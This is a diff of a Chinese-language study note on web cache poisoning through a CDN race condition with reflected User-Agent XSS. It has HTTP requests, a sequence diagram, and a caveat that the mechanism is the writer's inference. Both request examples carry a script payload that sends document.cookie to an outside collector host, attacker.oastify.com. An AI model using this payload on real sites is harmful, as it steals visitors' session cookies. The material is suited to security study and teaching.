@@ -517,59 +517,62 @@ x=1
 
 1. 主页面将某个**请求头反射到可执行上下文**中（如 `User-Agent`），且该头**不参与缓存键**
 2. CDN 剥离了 `Cache-Control` 等缓存头，但存在**内部/源站缓存**；同时 CDN 对**静态扩展名**（如 `.js`）的请求应用**更弱的 WAF 检查**
-3. CDN 的缓存行为对外部**隐藏缓存头**（即响应中不显示 `X-Cache`、`Cf-Cache-Status` 等），投毒效果仅通过**多小时刷新周期**才可见
+3. CDN 的缓存行为对外部**隐藏缓存头**（即响应中不显示 `X-Cache`、`Cf-Cache-Status` 等），投毒效果仅通过**数小时刷新周期**才可见
 
-### 攻击机制
+### 攻击机制（基于原文推演）
 
-关键洞察：CDN 对以 `.js` 等静态扩展名结尾的请求**自动缓存**且应用更弱的 WAF 检查（静态资源通常不会反射请求头）。但 CDN 的内部并发路由存在缺陷——一个请求的处理可能影响到另一个并发请求的缓存键分配。通过并发发送两个请求（一个走弱 WAF 的 `.js` 路径+恶意 UA，一个直走 `/`），攻击者的缓存键交叉污染可导致主页被投毒：
+两个请求**都携带恶意 UA**（Burp Match & Replace 全局替换），通过单包并发同时发送：
 
 ```http
-# 请求 1 — 走 .js 路径绕过严格 WAF（CDN 对此路径检查更弱）
+# 请求 1 — .js 路径，CDN 为此分配 .js 缓存槽
 GET /script.js HTTP/1.1
 Host: target.com
-User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
+User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>”
 
-# 请求 2 — 同时发起，目标为首页（两请求 UA 相同：均由 Burp Match & Replace 全局设置）
+# 请求 2 — / 路径，CDN 为此分配 / 缓存槽
 GET / HTTP/1.1
 Host: target.com
-User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>"
+User-Agent: Mo00ozilla/5.0</script><script>new Image().src='https://attacker.oastify.com?a='+document.cookie</script>”
 ```
 
-**竞争点**：两个请求**都携带恶意 UA**——Burp Match & Replace 将 UA 全局替换。请求 1 走 `.js` 路径，CDN 认为"静态资源不会反射请求头"，WAF 检查弱，恶意 UA 放行。请求 2 走 `/` 路径，本应受到强 WAF 检查——但由于与请求 1 **单包并发到达**，WAF 内部会话状态被请求 1 的"已放行"污染，请求 2 也被放行。主页 `/` 将恶意 UA **反射到 HTML 中** → 该含 XSS 的响应被缓存 → 所有后续访问 `/` 的用户命中缓存桶，收到投毒页面。
+**竞争结果**：请求 1（`.js`）收到正常 JS 内容——`.js` 文件不反射 UA。请求 2（`/`）到达主页，源站发现 UA 值、将其反射到 HTML 响应中 → 该响应含 XSS。CDN 并发处理两个请求时，内部缓存槽位分配器出现交叉——**请求 2 返回的主页 HTML（含反射 XSS）被错误写入了请求 1 的 `.js` 缓存槽**。
+
+正常用户访问 `/script.js` 时，CDN 从 `.js` 缓存桶返回的不是 JS 文件，而是含 XSS 的主页 HTML。
 
 ```mermaid
 sequenceDiagram
-    actor A as 攻击者 (Burp UA=恶意payload)
-    participant CDN as CDN/WAF
+    actor A as 攻击者 (UA=恶意payload)
+    participant CDN as CDN (并发处理)
     participant O as 源站 Origin
-    participant V as 受害者
+    participant V as 正常用户
 
-    Note over A: Burp Match & Replace<br/>全局替换 UA 为恶意 payload
-    A->>CDN: 请求 1: GET /script.js<br/>UA: <script>恶意payload
-    A->>CDN: 请求 2: GET /<br/>UA: <script>恶意payload
-    Note over CDN: ⚡ 单包并发 (Send group in parallel) ⚡
+    Note over A: Burp Match & Replace<br/>全局替换 UA
 
-    rect rgb(230, 255, 230)
-        Note over CDN: 请求1：走 .js 路径
-        CDN->>CDN: WAF 检查: 弱<br/>.js 是静态资源<br/>“不会反射请求头”<br/>→ 恶意 UA 放行 ✓
-        CDN->>O: 回源
-        O-->>CDN: 200 OK (正常 JS 内容)
-    end
+    A->>CDN: 请求1: GET /script.js + 恶意UA
+    A->>CDN: 请求2: GET / + 恶意UA
+    Note over CDN: 单包并发到达 → 分配两个缓存槽
 
-    rect rgb(255, 230, 230)
-        Note over CDN: 请求2：走 / 路径
-        CDN->>CDN: WAF 检查: 本应 强<br/>但 WAF 内部会话<br/>被请求1 的放行状态污染<br/>→ 恶意 UA 也被放行 ✗
-        CDN->>O: 回源 (带恶意 UA)
-        O-->>CDN: 200 OK (主页 HTML)<br/>含反射的恶意 UA → XSS
-    end
+    CDN->>O: 请求1 回源
+    O-->>CDN: 正常 JS 内容<br/>(.js 不反射 UA)
 
-    Note over CDN: 主页含 XSS 的响应<br/>被缓存到 缓存桶 "/"
+    CDN->>O: 请求2 回源
+    Note over O: 主页 / 反射 UA → XSS
+    O-->>CDN: 主页 HTML (含反射恶意 UA)
 
-    V->>CDN: GET /
-    CDN-->>V: 缓存命中 → 含 XSS 的主页
+    Note over CDN: ⚡ 竞态 ⚡<br/>缓存槽交叉污染<br/>请求2 的 HTML 被写入<br/>请求1 的 .js 缓存槽
+
+    Note over CDN: 缓存桶 /script.js:<br/>内容 = 含 XSS 的主页 HTML
+
+    V->>CDN: GET /script.js
+    CDN-->>V: 缓存命中 → 含 XSS 的主页 HTML
+    Note over V: 浏览器以 HTML 上下文<br/>执行 → XSS 触发
 ```
 
-> **注意**：这不是 Web Cache Deception 的路径混淆——两个请求都是对真实路径的请求。攻击依赖的是 CDN 内部路由竞态使并发请求的缓存键发生交叉，而非后端对同一路径的不同解释。
+### 为什么受害者会受影响
+
+`.js` 静态资源的缓存键**通常不包含 `User-Agent`**（CDN 不会为静态文件设置 `Vary: User-Agent`）。无论受害者使用什么浏览器、什么 UA，请求 `/script.js` 都会命中同一个被投毒的缓存槽。这与原文 “served to other visitors sharing the same cache key conditions” 一致——所有访问者共享同一 `.js` 缓存键，UA 差异不影响命中。
+
+> **⚠️ 源文局限**：HackTricks 源对 CDN 内部竞态机制使用模糊措辞（”request flow quirks”、”routing race”），以上推演基于原文中可确认的事实——(1) 主页反射 UA (2) CDN 自动缓存 .js (3) 单包并发是关键——但缓存槽交叉污染的确切代码路径源文未披露。
 
 ### 实战操作步骤
 
